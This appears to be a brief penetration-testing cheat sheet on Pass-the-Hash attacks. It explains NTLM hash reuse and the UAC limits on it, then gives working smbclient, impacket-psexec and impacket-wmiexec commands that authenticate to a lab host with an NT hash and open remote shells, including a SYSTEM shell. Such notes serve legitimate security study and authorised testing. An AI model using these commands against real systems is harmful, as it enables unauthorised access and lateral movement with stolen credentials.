# Pass-the-Hash (PtH)

Uses an **NTLM hash** directly to authenticate — no plaintext password needed. Works because NTLM hashes are not salted and remain static.

> Only works with NTLM authentication (not Kerberos). Since Windows Vista, UAC remote restrictions limit PtH to the built-in local Administrator account (not other admin group members) — unless UAC remote restrictions are disabled.

**smbclient:**
```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

**impacket-psexec (always gives SYSTEM shell):**
```bash
impacket-psexec -hashes 00000000000000000000000000000000:<NT-HASH> Administrator@192.168.50.212
```

**impacket-wmiexec (gives shell as authenticated user):**
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:<NT-HASH> Administrator@192.168.50.212
```
